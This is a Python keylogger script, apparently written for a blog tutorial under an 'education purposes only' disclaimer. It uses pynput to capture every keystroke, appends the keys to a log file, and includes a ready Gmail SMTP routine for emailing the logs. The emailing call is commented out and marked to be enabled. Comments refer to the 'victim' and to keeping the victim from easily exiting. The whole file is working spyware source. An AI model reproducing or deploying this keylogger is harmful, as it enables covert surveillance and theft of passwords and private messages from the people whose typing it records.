"""
    
    This code is for Education purposes only and I don't have any responsibilities for the way of using it.
    and made for a post on my website.
    https://letscode.erfanpaslar.ir/post.php?pId=18
"""

from os import system
# if you did the EVIL😈 part uncomment the next line
# system("explorer /root,") 
try:
    from pynput import keyboard
except ModuleNotFoundError:
    # print("I'm installing pynput library XD")
    system("pip install pynput")
    # print("I'v installed it :)")
    from pynput import keyboard


import ssl
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


#if you are using sendMail from the link below, check that the less secure app switch is on.
#! https://myaccount.google.com/u/4/lesssecureapps?pli=1&rapt=AEjHL4OwuAbXYjEW6n08tE-9REoITpxuSW8dzgr_9aU932Pc0jiSft9fvQuN7cfhUmK1cEAswfvsFFUS55jo0xwq5Jja_rpqQQ
def sendMail(mailTo, subject, text):
    sender_email = "your@gmail.com"
    receiver_email = mailTo
    password = "put your password here"

    message = MIMEMultipart("alternative")
    message["Subject"] = subject
    message["From"] = sender_email
    message["To"] = receiver_email
    part1 = MIMEText(text, "plain")
    message.attach(part1)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(
            sender_email, receiver_email, message.as_string()
        )

keysString = ""
count = 0

def doSomthingWithKeys():
    global keysString, count
    keysString = keysString.replace("'", "").replace("Key.", ""). replace(
        '""', "'")  # * formatting the output to be very small
    
    # We can do three things here:
    # 1. print the log.(that's just for test)
    # print(keysString)

    # 2.write it into a file (for now I use this method)
    with open('log.txt', 'a') as logFile:
        logFile.write(keysString)
    
    # 3.send the keys through gmail 
    # sendMail("mailTo@gmail.com", "Subject", keysString) #uncomment this line and put an email to sent to ( also you have to specify a gmail inside the sendmail function)
    # watch fo the Gmail limits(500 emails with 10000 chars per day)
    #! Gmail has a character limit of 10,000 characters, which is a lot of characters, but if you have a really long signature, it may just be too long.
    #! https://support.google.com/mail/answer/22839?hl=en#zippy=%2Cyou-have-reached-a-limit-for-sending-mail%2Cmessages-you-sent-couldnt-be-delivered%2Ca-contact-is-getting-too-much-mail

    keysString = ""
    count = 0


def onPress(key):
    global keysString, count
    count += 1
    keysString += "{}+,".format(key)
    if count > 200:# this is the number of keys that pressed or released, and the string length is abut 200*5 = 1000 chars BUT the ideal number is about 2000
        doSomthingWithKeys()
    # print("Key {} pressed.".format(key))


def onRelease(key):#you can ignore the released keys if you want. (just replace the next three lines with keyword "pass")
    global keysString, count
    count += 1
    keysString += "{}-,".format(key)

    # print("Key {} released.".format(key))
    # if str(key) == "Key.esc":  # for our exiting (but we don't want the victim easily Exits)
    #     print("Exiting...")
    #     return False


with keyboard.Listener(on_press=onPress, on_release=onRelease) as Listener:
    Listener.join()
